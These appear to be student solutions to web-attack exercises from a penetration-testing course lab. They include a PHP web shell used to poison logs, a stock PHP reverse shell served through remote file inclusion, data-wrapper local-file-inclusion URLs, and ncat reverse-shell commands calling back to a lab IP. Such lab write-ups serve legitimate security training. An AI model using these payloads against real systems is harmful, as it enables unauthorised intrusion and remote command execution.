= Solutions to exercises from Module 9: Web App Attacks

== 9.4.1.3

2. `INSERT INTO webappdb.users(username, password) VALUES('me', 'm2')`

== 9.4.2.6

2. The XSS vulnerability could be used to run a script on every machine that loads the site, for cryptomining. If the website allowed payments, scripts could be injected to read credit card data as it is input to the site.
3. The exploit attacks the clients of the site, since it requires the client to load the site to expose their session cookie.

== 9.4.4.5

2. We poison the logs with the line `<?php echo '<pre>' . shell_exec(base64_decode($_GET['cmd'])) . '</pre>';?>`
Then, to get a shell, we just submit the string of the output of the command `echo -n "ncat 192.168.119.224 4444 -e cmd.exe" | base64` as the `cmd` parameter

== 9.4.4.7

1. We use the same technique mentioned above, by exposing a file containing the above on a python HTTP server. 
2. The only difference here is to name the exposed file `current_menu.php`.
3. We start by getting the reverse shell script and renaming it `cp /usr/share/webshells/php/php_reverse_shell.php current_menu.php`.
Then, we replace the IP address, the port number, and the shell command to `cmd`, and start a python HTTP server.
Finally, we reload the URL with the remote path as the `file` parameter, and the script connects to our listener.

== 9.4.4.10

1. We use a data wrapper to retrieve the `ipconfig` of the server using
`http://192.168.224.10/menu.php?file=data:text/plain,%3C?php%20echo%20%27%3Cpre%3E%27%20.%20shell_exec($_GET[%27cmd%27])%20.%20%27%3C/pre%3E%27;?%3E&cmd=ipconfig`
2. We use the above to supply a cmd that opens a reverse shell back to our machine, using
`http://192.168.224.10/menu.php?file=data:text/plain,%3C?php%20echo%20%27%3Cpre%3E%27%20.%20shell_exec($_GET[%27cmd%27])%20.%20%27%3C/pre%3E%27;?%3E&cmd=ncat%20192.168.119.224%204444%20-e%20cmd.exe`

==
